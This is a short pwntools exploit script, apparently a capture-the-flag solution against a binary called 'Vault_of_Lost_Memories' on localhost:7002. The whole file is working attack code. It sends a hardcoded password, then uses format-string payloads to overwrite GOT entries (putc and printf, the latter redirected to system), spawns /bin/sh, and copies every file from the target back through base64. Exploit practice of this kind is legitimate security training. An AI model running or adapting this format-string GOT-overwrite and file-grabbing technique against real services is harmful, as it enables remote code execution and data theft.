from pwn import *
context.binary = ELF("./Vault_of_Lost_Memories")
context.log_level = "debug"

OFFSET = 6

password = b"Lost_in_Light"

system_plt = 0x401060
init_addr = 0x401448
putc_got = 0x404048
printf_got = 0x404020

fmt1 = fmtstr_payload(offset=OFFSET, writes={putc_got: init_addr}, write_size="short")
fmt2 = fmtstr_payload(offset=OFFSET, writes={printf_got: system_plt}, write_size="short")

p = remote("localhost", 7002)

p.sendlineafter(b">>> ", password)
p.sendlineafter(b">>> ", fmt1)
p.sendlineafter(b">>> ", fmt2)

p.sendline(b"/bin/sh")

p.clean()

p.sendline("ls")

files = p.clean().decode().strip().split("\n")
for file in files:
  p.sendline(f"base64 {file}".encode())
  encoded_file = p.clean().decode()
  with open(file, "wb") as f:
      f.write(b64d(encoded_file))
